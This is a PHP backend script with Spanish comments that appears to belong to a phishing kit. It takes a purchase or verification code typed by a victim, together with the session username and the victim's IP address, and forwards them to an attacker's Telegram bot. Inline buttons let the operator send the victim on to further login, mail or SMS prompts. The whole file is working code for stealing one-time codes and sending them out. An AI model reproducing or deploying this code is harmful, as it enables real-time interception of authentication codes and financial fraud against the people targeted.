<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
include '../oslo.php';

// Verificar que las variables estén definidas
if (!isset($ambar) || !isset($koala)) {
    die(json_encode(["success" => false, "message" => "Error: Configuración de Telegram no encontrada."]));
}

// Obtener usuario de sesión
$yunta = $_SESSION['usuario'] ?? 'desconocido';

// Obtener los datos enviados por POST
$input = file_get_contents("php://input");
$data = json_decode($input, true);
$codigo = $data['codigo'] ?? '';

// Validar el código
if (empty($codigo)) {
    die(json_encode(["success" => false, "message" => "Código no válido."]));
}

// Obtener la IP del cliente
$sombra = ip_yago();

// Crear el mensaje
$dalia = "🔐 *CÓDIGO DE COMPRA RECIBIDO* 🔐\n\n";
$dalia .= "👤 *Usuario*: $yunta\n";
$dalia .= "🔢 *Código*: $codigo\n";
$dalia .= "🌍 *IP del Cliente*: $sombra\n";

// Crear botones inline
$ignis = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '🔁 Login', 'callback_data' => "LOGIN|$yunta"],
            ['text' => '📩 Mail', 'callback_data' => "MAIL|$yunta"],
            ['text' => '📩 SMS', 'callback_data' => "SMS|$yunta"],
            ['text' => '✅ Listo', 'callback_data' => "LISTO|$yunta"]
        ],
        [
            ['text' => '❌ Compra', 'callback_data' => "COMPRA|$yunta"]
        ]
    ]
]);

// Enviar los datos a Telegram
$juno = "https://api.telegram.org/bot$ambar/sendMessage";
$telegram_data = [
    'chat_id' => $koala,
    'text' => $dalia,
    'parse_mode' => 'Markdown',
    'reply_markup' => $ignis
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $juno);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Responder con éxito o error
if ($response === false) {
    echo json_encode(["success" => false, "message" => "Error al enviar el mensaje a Telegram."]);
} else {
    echo json_encode(["success" => true, "message" => "Código enviado con éxito."]);
}
?>
